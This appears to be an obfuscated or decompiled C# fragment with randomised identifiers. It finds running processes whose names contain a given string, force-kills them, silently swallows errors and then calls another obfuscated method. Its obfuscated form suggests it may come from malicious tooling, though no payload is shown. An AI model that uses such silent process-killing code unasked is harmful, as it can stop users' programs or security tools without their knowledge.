using System;
using System.Diagnostics;

namespace WEoqBCtavg;

public sealed class nAlFIBgmRVNm
{
	public static bool UsNCQEurnU(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void LttIMzUjitI(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (UsNCQEurnU(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					TwRTxDxfshC.WgRVQlryKrmypu();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
